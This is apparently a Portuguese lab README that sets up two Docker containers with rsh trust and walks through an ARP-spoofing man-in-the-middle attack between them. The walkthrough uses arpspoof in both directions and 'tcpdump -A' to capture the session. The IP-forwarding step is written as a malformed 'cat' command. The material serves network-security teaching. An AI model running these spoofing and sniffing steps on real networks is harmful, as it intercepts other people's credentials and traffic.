# Docker setup

## maquina local

para subir os dois containers rodar
`sudo bash start.sh` \
(duas vezes na primeira vez).

> **informacao de saida usa pra preencher os containers**

- comandos uteis:\
  `docker stop <nome>` \
  `docker rm <nome>`

## containers

- criar usuario no **server**: \
  adduser \<usuario> \
  passwd \<usuario> \
  $ digita senha <senha>

- configurar no **xterm** e no **server**:\
  adicionar IP NOME remoto em /etc/hosts \
  adicionar IP NOME remoto em /root/.rhosts

**No server**

- inicializar serviço servidor

```
server@id:$ /etc/init.d/openbsd-inetd start
```

## mitm

- em localhost: `cat 1 /proc/sys/net/ipv4/ip_forward`
- logar no server pelo **xterminal**:

```
// xterminal
xterm@id:$ rsh <IP_server> -l <username>
digita a senha de <username> do server

server@id:$ while :; do echo "Press [CTRL+C] to stop";sleep 4; done
```

- em **server**

```
server@id:$ tcpdump arp
```

- em **localhost** root:\
  (`ifconfig -a` mostra info do `docker0`)

```
// em uma tab
root@localhost:$ arpspoof -i docker0 -t <IP_server> <IP_xterm>

// em outra tab
root@localhost:$ arpspoof -i docker0 -t <IP_xterm> <IP_server>

// na 3a tab
user@localhost:$ tcpdump -A
```
